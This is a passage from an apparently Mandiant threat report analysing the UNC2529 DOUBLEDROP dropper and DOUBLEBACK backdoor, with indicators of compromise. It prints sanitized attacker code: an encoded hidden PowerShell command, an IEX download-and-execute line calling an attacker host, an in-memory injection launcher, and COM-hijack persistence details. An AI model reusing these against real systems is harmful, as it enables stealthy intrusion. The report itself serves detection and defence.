<tbody><tr><td><span class="code">&quot;C:\Windows\System32\cmd.exe&quot; /c oqaVepEgTmHfPyC &amp; Po^wEr^sh^elL -nop -w hidden -ep bypass -enc &lt;base64_encoded_ps_code&gt;</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 3: De-obfuscated JavaScript downloader</span></p>
<p>The <span class="code">&lt;base64_encoded_ps_code&gt;</span> downloads and executes a PowerShell script that implements the DOUBLEDROP dropper. Note, that the downloaded dropper does not touch the file system and it is executed directly from memory. A sanitized version of the code, observed in the first phishing wave, is shown in Figure 4.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">IEX (New-Object Net.Webclient).downloadstring(&quot;hxxp://p-leh[.]com/update_java.dat&quot;)</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 4: Downloading and executing of the DOUBLEDROP dropper</span></p>
<h4>DOUBLEDROP Dropper component</h4>
<h5>Overview</h5>
<p>The dropper component is implemented as an obfuscated in-memory dropper written in PowerShell. Two payloads are embedded in the scriptâ€”the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the encrypted payload along with the information related to its decryption and execution in the compromised systemâ€™s registry database, effectively achieving a file-less malware execution.</p>
<h5>Setup</h5>
<p>The dropper's main goal is to serialize the chosen payload along with the loading scripts into the compromised system's registry database and to ensure that the payload will be loaded following a reboot or a user login (see the Persistence Mechanism section). In order to do so, the dropper generates three pseudo-random GUIDs and creates the registry keys and values shown in Figure 5.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><p><span class="code">* HK[CU|LM]\Software\Classes\CLSID\{&lt;rnd_guid_0&gt;}<br>
&nbsp; &nbsp; &nbsp; &nbsp;* key: LocalServer<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;bootstrap_ps_code&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp;* key: ProgID<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_1&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;last_4_chars_of_rnd_guid_0&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;encoded_loader&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp;* key: VersionIndependentProgID<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_1&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;first_4_chars_of_rnd_guid_0&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;encoded_rc4_key&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;last_4_chars_of_rnd_guid_0&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rc4_encrypted_payload&gt;</span></p>
<p><span class="code">* HK[CU|LM]\Software\Classes\{&lt;rnd_guid_1&gt;}<br>
&nbsp; &nbsp; &nbsp; &nbsp;* value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_1&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp;* key: CLSID<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_0&gt;</span></p>
<p><span class="code">* HK[CU|LM]\Software\Classes\CLSID\{&lt;rnd_guid_2&gt;}<br>
&nbsp; &nbsp; &nbsp; &nbsp;* value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_1&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp;* key: TreatAs<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * value: &lt;default&gt;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * data: &lt;rnd_guid_0&gt;</span></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Figure 5: Registry keys and values created by the dropper</span></p>
<p>Once the registry keys and values are created, the dropper dynamically generates the bootstrap and the launcher PowerShell scripts and saves them under the <span class="code">{&lt;rnd_guid_0&gt;}</span> registry key as shown in Figure 5. Additionally, at this point the dropper generates a random RC4 key and encodes it inside a larger buffer which is then saved under the VersionIndependentProgID key. The actual RC4 key within the buffer is given by the following calculations, shown in Figure 6 (note that the key is reversed!).</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">&lt;relative_offset&gt; = buffer[32]<br>
buffer[32 + &lt;relative_offset&gt; + 1] = &lt;reversed_rc4_key&gt;</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 6: Encoding of the RC4 key</span></p>
<p>Finally, the dropper encrypts the payload using the generated RC4 key and saves it in the respective value under the VersionIndependentProgId registry key (see Figure 5).</p>
<p>At this point all the necessary steps that ensure the payload's persistence on the system are complete and the dropper proceeds by directly executing the launcher script, so the backdoor receives the execution control immediately. The persistence mechanism, the bootstrap, and the launcher are described in more details in the following sections.</p>
<h5>Persistence Mechanism</h5>
<p>The persistence mechanism implemented by the DOUBLEDROP sample is slightly different depending on whether the dropper has been started within an elevated PowerShell process or not.</p>
<p>If the dropper was executed within an elevated PowerShell process, it creates a scheduled task with an action specified as TASK_ACTION_COM_HANDLER and the class ID - the <span class="code">{&lt;rnd_guid_2&gt;}</span> GUID (See Figure 5). Once executed by the system, the task finds the <span class="code">{&lt;rnd_guid_2&gt;}</span> class under the HKLM\Software\Classes\CLSID registry path, which in this case points to an emulator class via the TreatAs registry key. The <span class="code">{&lt;rnd_guid_0&gt;}</span> emulator class ID defines a registry key LocalServer and its default value will be executed by the task.</p>
<p>If the dropper is started within a non-elevated PowerShell process, the sequence is generally the same but instead of a task, the malware hijacks one of the well-known classes, Microsoft PlaySoundService ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor ({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated TreatAs registry key under their definition in the registry database. The TreatAs key's default registry value points to the <span class="code">{&lt;rnd_guid_0&gt;}</span> emulator class essentially achieving the same execution sequence as in the elevated privilege case.</p>
<h5>Bootstrap</h5>
<p>The bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper. The content of the code is saved under the emulator's class LocalServer registry key and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or MsCtfMonitor classes.&nbsp;</p>
<p>The bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process. A decoded and sanitized version of the script is shown in Figure 7.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">$enc = [System.Text.Encoding]::UTF8;<br>
$loader = Get-ItemProperty<br>
&nbsp; &nbsp; -Path($enc.GetString([Convert]::FromBase64String('&lt;base64_encoded_path_to_launcher&gt;')))<br>
&nbsp; &nbsp; -n '&lt;launcher_reg_val&gt;' | Select-Object -ExpandProperty '&lt;launcher_reg_val&gt;';<br>
$xor_val = &lt;xor_val&gt;;<br>
iex(<br>
&nbsp; &nbsp; $enc.GetString($(<br>
&nbsp; &nbsp; &nbsp; &nbsp; for ($i = 0; $i -lt $loader.Length; $i++) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($xor_val -ge 250) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $xor_val = 0<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $loader[$i] -bxor $xor_val;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $xor_val += 4<br>
&nbsp; &nbsp; &nbsp; &nbsp; }<br>
&nbsp; &nbsp; ))<br>
)</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 7: De-obfuscated and sanitized bootstrap code</span></p>
<p>Note that the actual values for <span class="code">&lt;base64_encoded_path_to_launcher&gt;</span>, <span class="code">&lt;launcher_reg_val&gt;</span>, and <span class="code">&lt;xor_val&gt;</span> are generated on the fly by the dropper and will be different across the compromised systems.</p>
<p>The encoding of the launcher is implemented as a simple rolling XOR that is incremented after each iteration. The following code snippet (Figure 8) could be used to either encode or decode the launcher, given the initial key.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">def encdec(src, key):<br>
&nbsp; &nbsp; out = bytearray()<br>
&nbsp; &nbsp; for b in src:<br>
&nbsp; &nbsp; &nbsp; &nbsp; if key &gt;= 250:<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key = 0<br>
&nbsp; &nbsp; &nbsp; &nbsp; out.append(b ^ key)<br>
&nbsp; &nbsp; &nbsp; &nbsp; key += 4<br>
&nbsp; &nbsp; return out</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 8: Algorithm to Decode the Launcher</span></p>
<p>Once the launcher is decoded it is executed within the same PowerShell process as the bootstrap by calling the iex (Invoke-Expression) command.</p>
<h5>Launcher</h5>
<p>The launcher responsibility, after being executed by the bootstrap code, is to decrypt and execute the payload saved under the VersionIndependentProgID registry key. To do so, the launcher first decodes the RC4 key provided in the <span class="code">&lt;first_4_chars_of_rnd_guid_0&gt;</span> value (see Figure 5) and then uses it to decrypt the payload. Once the payload is decrypted, the launcher allocates virtual memory enough to house the image in memory, copies it there, and finally creates a thread around the entry point specified in the dropper. The function at that entry point is expected to lay the image in memory, to relocate the image, if necessary, to resolve the imports and finallyâ€”to execute the payload's entry point.</p>
<p>A sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><p><span class="code">function DecryptPayload {<br>
&nbsp; &nbsp; param($fn7, $xf7, $mb5)<br>
&nbsp; &nbsp; $fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5;<br>
&nbsp; &nbsp; $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11)));<br>
&nbsp; &nbsp; $ow7 = $fn1[$en8..($en8 + 31)];<br>
&nbsp; &nbsp; [array]::Reverse($ow7);<br>
&nbsp; &nbsp; $fn1 = Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7;<br>
&nbsp; &nbsp; $en8 = {<br>
&nbsp; &nbsp; &nbsp; &nbsp; $xk2 = 0..255;<br>
&nbsp; &nbsp; &nbsp; &nbsp; 0..255 | % {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $wn4 = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 + (11 + 5)));<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_]<br>
&nbsp; &nbsp; &nbsp; &nbsp; };<br>
&nbsp; &nbsp; &nbsp; &nbsp; $fn1 | % {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $sp3 = ($sp3 + 1) % (275 - 19);<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64);<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3];<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))]<br>
&nbsp; &nbsp; &nbsp; &nbsp; }<br>
&nbsp; &nbsp; };<br>
&nbsp; &nbsp; $ry6 = (&amp; $en8 | foreach-object { '{0:X2}' -f $_ }) -join '';<br>
&nbsp; &nbsp; ($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) {<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0))))<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>
&nbsp; &nbsp; &nbsp; &nbsp; )<br>
&nbsp; &nbsp; )<br>
}</span></p>
<p><span class="code">function ExecuteApi {<br>
&nbsp; &nbsp; param($fn7, $xf7)<br>
&nbsp; &nbsp; $vy9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('?RND?')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?', $false).DefineType('?RND?', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate]);<br>
&nbsp; &nbsp; $vy9.DefineConstructor('RTSpecialName,HideBySig,Public', [System.Reflection.CallingConventions]::Standard, $fn7).SetImplementationFlags('Runtime,Managed');<br>
&nbsp; &nbsp; $vy9.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $xf7, $fn7).SetImplementationFlags('Runtime,Managed');<br>
&nbsp; &nbsp; $vy9.CreateType()<br>
}</span></p>
<p><span class="code">function GetProcAddress {<br>
&nbsp; &nbsp; param($fn7)<br>
&nbsp; &nbsp; $fq3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {<br>
&nbsp; &nbsp; &nbsp; &nbsp; $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')<br>
&nbsp; &nbsp; }).GetType('Microsoft.Win32.UnsafeNativeMethods');<br>
&nbsp; &nbsp; $lr3 = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fq3.GetMethod('GetModuleHandle').Invoke(0, @('kernel32.dll'))));<br>
&nbsp; &nbsp; $fq3.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$lr3, $fn7))<br>
}</span></p>
<p><span class="code">$decryptedPayload = DecryptPayload 'hklm:\software\classes\CLSID\&lt;rnd_guid_0&gt;\VersionIndependentProgID' '&lt;reg_val_payload&gt;' '&lt;reg_val_rc4_key&gt;';</span></p>
<p><span class="code">function InjectPayload {<br>
&nbsp; &nbsp; param($payload, $payloadLen, $entryPoint, $access)<br>
&nbsp; &nbsp; $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0, $payloadLen, 0x3000, $access);</span></p>
<p><span class="code">&nbsp;&nbsp;&nbsp; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem, $payload, $payloadLen);<br>
&nbsp; &nbsp; $mem = New-Object System.Intptr -ArgumentList $($mem.ToInt64() + $entryPoint);</span></p>
<p><span class="code">&nbsp;&nbsp;&nbsp; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem, 0, 0, 0);<br>
&nbsp; &nbsp; Start-Sleep -s (((2673 - 942) + 1271))<br>
}</span></p>
<p><span class="code"># 0x36dc = Loader Entry Point, rva<br>
# 0x40 = PAGE_EXECUTE_READWRITE<br>
InjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40</span></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Figure 9: De-obfuscated and sanitized launcher script</span></p>
<h4>DOUBLEBACK Backdoor component</h4>
<h5>Overview</h5>
<p>The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64-bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process.&nbsp;</p>
<p>In contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoorâ€™s main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins.</p>
<h5>Details</h5>
<p>The backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections.&nbsp;</p>
<p>Next, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume's serial number and a hardcoded salt value, as shown in Figure 10.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code"># oberserved salt = 0x436ea76d<br>
def gen_host_id(vol_ser_num, salt):<br>
&nbsp; &nbsp; salted_val = (vol_ser_num + salt) &amp; 0xffffffff<br>
&nbsp; &nbsp; md5 = hashlib.md5(bytes(salted_val.to_bytes(4, 'little')))<br>
&nbsp; &nbsp; second_dword = struct.unpack('&lt;i', md5.digest()[4:8])[0]<br>
&nbsp; &nbsp; return (salted_val + second_dword) &amp; 0xffffffff</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 10: Host ID generation algorithm</span></p>
<p>Next, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code"># src is the host ID<br>
def gen_guid(src):<br>
&nbsp; &nbsp; b = bytearray()<br>
&nbsp; &nbsp; xor = 0xaabbccdd<br>
&nbsp; &nbsp; for _ in range(4):<br>
&nbsp; &nbsp; &nbsp; &nbsp; b += src.to_bytes(4, byteorder='little')<br>
&nbsp; &nbsp; &nbsp; &nbsp; src ^= xor<br>
&nbsp; &nbsp; &nbsp; &nbsp; xor = (xor + xor) &amp; 0xffffffff<br>
&nbsp; &nbsp; return uuid.UUID(bytes_le=bytes(b))</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 11: GUID generation algorithm</span></p>
<p>Once the GUID is generated the malware formats it as Global\{<span class="code">&lt;guid&gt;</span>} and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into.</p>
<h4>Executing Within the PowerShell Process</h4>
<p>The initial state of the backdoor execution is when it is mapped into a PowerShell process created by the bootstrap code. In this mode, the backdoor attempts to relocate itself into a new instance of msiexec.exe. Before the injection is attempted, the backdoor enumerates the running processes looking for Kaspersky Antivirus (avp.exe, avpui.exe) or BitDefender (bdagent.exe, bdservbdagent.exe, bdservicehost.exe) engines. This part of the functionality seems to be a work in progress because the malware ignores the fact if the Kaspersky software is detected but it will not attempt injecting into the msiexec.exe process in case BitDefender is found running on the compromised system. In the latter case, the backdoor's main functionality will be executed inside the same PowerShell process and no new instance of msiexec.exe will be created.</p>
<p>The injection process involves finding the backdoor's image under the appropriate registry key. Note, that the backdoor instance we have observed in the first wave does not handle situations when the malware ecosystem is installed as an administratorâ€”such cases would end up with the backdoor not able to locate its image for injecting. In all other cases, the malware starts with the well-known class GUIDs of the PlaySoundService and MsCtfMonitor classes and attempts to find which of them has the TreatAs registry key under their definition. Once the TreatAs key is found, its default registry value points to the registry key that has the RC4-encrypted backdoor image and the encoded RC4 key both described in the previous section of the post.</p>
<p>With the backdoor image loaded in memory and decrypted, the malware spawns a suspended process around msiexec.exe and inject its image into it. The backdoor PE file exports a single function that is used to lay down its own image in memory and execute its DllMain entry point. The export function allocates the needed memory, relocates the image, if needed, resolves the imports and finally executes the backdoorâ€™s DllMain function.</p>
<p>At this point the backdoor is running inside the hijacked msiexec.exe and the instance inside the PowerShell process terminates itself.</p>
<h4>Executing as Injected in the msiexec.exe Process</h4>
<h5>Overview</h5>
<p>The DOUBLEBACK backdoor executes its main functionality while injected in a dedicated msiexec.exe process (provided BitDefender AV is not found running on the system). The main logical modules of the backdoor are its configuration, plugin management, and communications. In the following sections we will describe the first two, while a future blog post will focus on the communications and the evolution of the backdoor.</p>
<h5>Configuration</h5>
<p>The backdoor uses an embedded configuration that contains the C2 URLs and a key (more about the key in the second part of the post). The configuration data is formatted as shown in Figure 12.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><p><span class="code">struct tag_config_header_t {<br>
&nbsp; &nbsp; uint32_t xor_val_1;<br>
&nbsp; &nbsp; uint32_t xor_val_2;<br>
&nbsp; &nbsp; uint32_t xor_val_3;<br>
&nbsp; &nbsp; uint32_t xor_val_4;<br>
} config_header_t;</span></p>
<p><span class="code">struct tag_config_t {<br>
&nbsp; &nbsp; config_header_t header;<br>
&nbsp; &nbsp; uint8_t encoded_config[];<br>
} config_t;</span></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Figure 12: Encoded configuration format</span></p>
<p>The length of the encoded_config data is provided by the XOR-ing of the xor_val_1 and xor_val_2 fields of the config_header_t structure. The config_t.encoded_config blob can be decoded by XOR-ing the data with the config_header_t.xor_val_1.</p>
<p>The decoded configuration data consists of a comma-separated list of URLs followed by a key that is used in the communication module. The first two bytes specify the lengths of the comma-separated URL list and the key, respectively. The URLs in the observed samples follow the pattern shown in Figure 13.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">https://&lt;server&gt;/admin&lt;n&gt;/client.php</span></td>
</tr></tbody></table>
<p>Figure 13: Observed C2 URL pattern</p>
<p>The initial sample did not have any value for <span class="code">&lt;n&gt;</span> but the samples after that were observed to use <span class="code">&lt;n&gt;</span> equal to 4 or 5.</p>
<h5>Plugin Management</h5>
<p>The backdoor's core functionality is implemented via plugins designed as PE Windows dynamic libraries. The plugins, as with the other backdoor components, are also saved in the registry database under a host-specific registry key. The full path to the plugins location is formatted as HK[LM|CU]:\Software\Classes\CLSID\{<span class="code">&lt;plugins_home_guid&gt;</span>}, where <span class="code">&lt;plugins_home_guid&gt;</span> is generated by the GUID algorithm shown in Figure 11 with a host-specific value we call implant ID which is used not only to generate the path to the plugins but with the backdoorâ€™s C2 communications and it is also passed as a parameter to each of the plugins during their initialization. The implant ID is generated by seeding the Linear Congruential Generator (LCG) algorithm, shown in Figure 14, with the host ID and the <span class="code">&lt;max_range&gt;</span> value is set to 0x54c5638. The value generated by the LCG is then added to 0x989680 and the result serves as the implant ID.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">def lcg(max_range):<br>
&nbsp; &nbsp; global seed<br>
&nbsp; &nbsp; if seed == 0:<br>
&nbsp; &nbsp; &nbsp; &nbsp; seed = get_RDTSC()<br>
&nbsp; &nbsp; n = (0x7fffffed * seed + 0x7fffffc3) &amp; 0xffffffff<br>
&nbsp; &nbsp; val = n % max_range<br>
&nbsp; &nbsp; seed = n<br>
&nbsp; &nbsp; return val</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 14: Linear Congruential Generator used by the backdoor</span></p>
<p>The backdoor enumerates all the registry values under the plugins home location (the registry value names are insignificant) and expects each of the plugins to be formatted, as shown in Figure 15.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><p><span class="code">struct tag_plugin_header_t {<br>
&nbsp; &nbsp; uint32_t xor_val;<br>
&nbsp; &nbsp; uint32_t param_2; the second parameter of the pfn_init<br>
&nbsp; &nbsp; uint32_t len_1;<br>
&nbsp; &nbsp; uint32_t len_2;<br>
&nbsp; &nbsp; uint32_t pfn_init;<br>
&nbsp; &nbsp; uint32_t pfn_cleanup;<br>
&nbsp; &nbsp; uint32_t param_3; the third parameter of the pfn_init<br>
&nbsp; &nbsp; uint32_t unused;<br>
} plugin_header_t;</span></p>
<p><span class="code">struct tag_plugin_t {<br>
&nbsp; &nbsp; &nbsp; &nbsp;plugin_header_t header;<br>
&nbsp; &nbsp; &nbsp; &nbsp;uint8_t encoded_plugin[];<br>
} plugin_t;</span></p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Figure 15: Encoded plugins format</span></p>
<p>As shown in Figure 15, the plugin data starts with a 32-byte long header followed by the encoded plugin DLL. The plugin encoding is implemented as a combination of rolling DWORD/BYTE XOR with initial value specified by the plugin_header_t.xor_val value. The plugin_header_t.len_1 stores the number of DWORDS to be decoded with plugin_header_t.xor_val which is incremented by 4 after each iteration. The plugin_header_t.len_2 specifies the number of bytes to be decoded at the current position after the previous operation with the current value of the plugin_header_t.xor_val (only the least significant byte is taken). In this mode the plugin_header_t.xor_val value is incremented by one after each iteration.</p>
<p>The plugins are expected to export at least two functionsâ€”one for initialization and another to clean up the resources before unloading. The initialization routine takes four parametersâ€”two from the header and two calculated by the backdoor, as shown Figure 16.</p>
<table cellpadding="1" cellspacing="0" border="1">
<tbody><tr><td><span class="code">pfn_init(implant_id, plugin_header_t.param_2, plugin_header_t.param_3, p_plugin_image_in_memory)</span></td>
</tr></tbody></table>
<p><span class="type-XS">Figure 16: Plugins initialization routine prototype</span></p>
<p>The current backdoor's implementation provides support for up to 32 plugins with each of them mapped and initialized in the backdoor's process space.</p>
<h5>Additional Notes</h5>
<p>The first backdoor instance we observed back in December 2020 was a stable and well-written code, but it was clearly a work in progress. For example, the early instance of the malware spawns a thread to secure delete the DOUBLEDROP dropper from disk which indicates that an earlier variant of this malware launched a copy of the dropper from the file system. The dropper would save its current location on disk in the default registry value under the HK[LM|CU]:\Software\Classes key. The backdoor spawns a dedicated thread that retrieves the dropperâ€™s path and then proceeds to overwrite the image on disk with 0x00, 0xFF, and a randomly generated byte before deleting the dropper from the file system.</p>
<p>Additionally, the early instance of the backdoor, as mentioned, would not handle the situations when an elevated PowerShell process is used. The dropper would use a scheduled task in that case with the relevant registry keys created under the HKLM hive but the backdoor does not support that case and will not be able to find its image under the specific key in order to inject itself into the msiexec.exe process.</p>
<p>Finally, the backdoor would output debug information in a few cases using the OutputDebugString API. Interestingly, the format and the generation of the log message is the same as the one used in the <a adhocenable="false" href="https://github.com/DeadNumbers/Pegasus/blob/f83159ebcc2b2ba429b23805fdc66ab3eb2959f5/Pegasus/inc/dbg.c">publicly available PEGASUS&nbsp;code</a>&nbsp;(<a adhocenable="false" href="https://advantage.mandiant.com/reports/18-00012170">preliminary technical analysis: Pegasus Malware Source Code</a>). The PEGASUS backdoor is distributed with modules that allow it to manipulate files generated by common Russian payment processing software that is used to assess and process VAT refunds. When executed on a workstation running targeted software, the malware can attempt to add VAT to transactions that are normally exempt and directs associated tax refunds to attacker-controlled bank accounts.</p>
<h4>Conclusion</h4>
<p>Considerable resources were employed by UNC2529 to conduct their December phishing campaign. Almost 50 domains supported various phases of the effort, targets were researched, and a legitimate third-party domain was compromised. The threat actor made extensive use of obfuscation and fileless malware to complicate detection to deliver a well coded and extensible backdoor. UNC2529 is assessed as capable, professional and well resourced. The identified wide-ranging targets, across geography and industry suggests a financial crime motive.</p>
<p>DOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further actions by UNC2529 to compromise victims across all industries worldwide.</p>
<h4>Technical Indicators</h4>
<h5>DOUBLEDRAG / BIFF8</h5>
<p><i>Files</i></p>
<table border="1" cellspacing="0" cellpadding="0" width="480">
<tbody><tr><td width="257" valign="top"><p><b>MD5</b></p>
</td>
<td width="142" valign="top"><p><b>Role</b></p>
</td>
<td width="81" valign="top"><p><b>Wave</b></p>
</td>
</tr><tr><td width="257" valign="top"><p>39fc804566d02c35f3f9d67be52bee0d</p>
</td>
<td width="142" valign="top"><p>DOUBLEDRAG</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>44f7af834ee7387ac5d99a676a03cfdd</p>
</td>
<td width="142" valign="top"><p>DOUBLEDRAG</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
</tr><tr><td width="257" valign="top"><p>4e5583e34ad54fa7d1617f400281ba56</p>
</td>
<td width="142" valign="top"><p>PDF Decoy</p>
</td>
<td width="81" valign="top"><p>1<sup>st</sup></p>
</td>
